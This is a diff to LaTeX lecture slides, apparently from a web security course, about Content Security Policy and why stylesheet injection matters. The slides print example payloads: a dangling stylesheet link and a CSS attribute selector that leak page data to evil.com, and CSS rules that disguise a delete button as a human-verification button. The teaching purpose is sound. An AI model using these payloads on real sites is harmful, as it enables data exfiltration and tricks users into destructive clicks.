@@ -19,19 +19,33 @@
     %"frame-src https://*.talkgadget.google.com/ 'self' https://hangouts.google.com/ https://talkgadget.google.com/ https://drive.google.com/picker https://ssl.gstatic.com https://accounts.google.com/ https://ssl.google-analytics.com/ https://feedback.googleusercontent.com/resources/ https://www.google.com/tools/feedback/ https://support.google.com/inapp/ https://plus.google.com/ https://docs.google.com/ https://clients5.google.com/pagead/drt/dn/ https://clients5.google.com/ads/measurement/jn/ https://clients6.google.com/static/ https://mail.google.com/mail/ https://mail-attachment.googleusercontent.com/attachment/ https://apis.google.com/additnow/ https://notifications.google.com/ https://people-pa.clients6.google.com/static/;script-src https://maps.gstatic.com/ https://*.talkgadget.google.com/ blob: 'self' 'unsafe-inline' 'unsafe-eval' https://hangouts.google.com/ https://talkgadget.google.com/ https://apis.google.com/ https://ajax.googleapis.com/ https://maps.googleapis.com/maps/api/ https://maps.googleapis.com/maps-api-v3/ https://www-onepick-opensocial.googleusercontent.com/gadgets/js/ https://ssl.google-analytics.com/ https://feedback.googleusercontent.com/resources/ https://www.gstatic.com/feedback/ https://clients1.google.com/complete/ https://www.gstatic.com/og/ https://www.googleapis.com/appsmarket/ https://www.google.com/tools/feedback/;img-src https: blob: data:;report-uri /cspreport"
 \end{frame}
 
-\begin{frame}[fragile]{Aside: why care about stylesheets?}
+\begin{frame}[fragile]{Aside: why care about stylesheets? (1)}
     \begin{itemize}
-    \item get data: \verb|<link rel=stylesheet href="http://evil.com/?webpage contents here...|
-    \item conditional image loaded to get data? assuming pre-filled-in-form:
-        \begin{itemize}
-        \item \verb|input[value^=Virginia] {background: url(http://evil.com?Virginia)}|
-        \end{itemize}
-    \item adjust webpage display in lots of ways
-        \begin{itemize}
-        \item convince user to click in wrong places?
-        \end{itemize}
-    \item IE 7 supported CSS expressions that can construct URLs from webpage data directly
+    \item historical: IE 7 supported CSS expressions that can construct URLs from webpage data
+    \item getting web page contents: 
+\begin{Verbatim}[fontsize=\small]
+<link rel=stylesheet href="http://evil.com/?webpage contents here...
+\end{Verbatim}
+    \item also can do things with stylesheets
     \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]{Aside: why care about stylesheets? (2)}
+    \begin{itemize}
+    \item conditional image loaded to get data? assuming pre-filled-in-form: 
+    \end{itemize}
+\begin{Verbatim}[fontsize=\fontsize{10}{11}]
+input[value^=Virginia] {background: url(http://evil.com?Virginia)}
+\end{Verbatim}
+    \begin{itemize}
+    \item adjust webpage display in lots of ways
+    \end{itemize}
+\begin{Verbatim}[fontsize=\fontsize{10}{11}]
+.delete-form::before {content: "Please verify that you are human: ";}
+button.cancel { display: none };
+button.delete { font-size: 0pt; }
+button.delete::before { content: "I am Human!"; font-size: 16pt; }
+\end{Verbatim}
 \end{frame}
 
 \begin{frame}{Content Security Policy examples (1)}
